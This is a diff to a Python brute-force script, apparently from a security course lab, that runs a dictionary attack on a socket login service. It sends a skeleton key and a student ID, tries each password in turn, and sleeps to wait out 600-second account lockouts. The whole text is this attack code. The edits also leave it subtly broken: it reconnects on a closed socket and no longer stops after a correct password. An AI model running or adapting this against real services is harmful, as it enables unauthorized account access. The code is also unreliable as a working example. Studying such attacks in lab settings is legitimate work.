@@ -15,7 +15,7 @@ def create_dict():
           passwords.append(line.replace('\n',''))
      return passwords
 
-# Assuming NO lockout
+# Assuming NO initial lockout
 def crack_password(PORT, s):
      passwords = create_dict()
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,11 +33,10 @@ def crack_password(PORT, s):
           s.sendall(password)
           data = s.recv(BYTES)
           print("\tData received: %s" % data)
-          if data == "Too many failed login attempts, account is locked for the next 600 seconds, goodbye.\n" or data == '':
-               print("Sleep for 602 seconds at %s" % str(datetime.datetime.now()))
+          if data == '':
+               print("\tSleep for 602 seconds at %s" % str(datetime.datetime.now()))
                s.close()
                time.sleep(602)
-               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                s.sendall(SKELETONKEY)
                time.sleep(2)
@@ -49,11 +48,20 @@ def crack_password(PORT, s):
                print("\tData received: %s" % data)
           elif data == "Incorrect password, goodbye.\n":
                print("\tThe password %s is incorrect." % password)
-               data = None
+               s.close()
+               time.sleep(2)
+               s.connect((HOST, PORT))
+               s.sendall(SKELETONKEY)
+               time.sleep(2)
+               data = s.recv(BYTES)
+               print("\tData received: %s" % data)
+               print("\tSending username...")
+               s.sendall(CRUZID)
+               data = s.recv(BYTES)
+               print("\tData received: %s" % data)
           else:
                print("The password %s is correct!" % password)
                print("Data received: %s" % data)
-               break
 
 def try_ports():
      fp = open("out", "r")
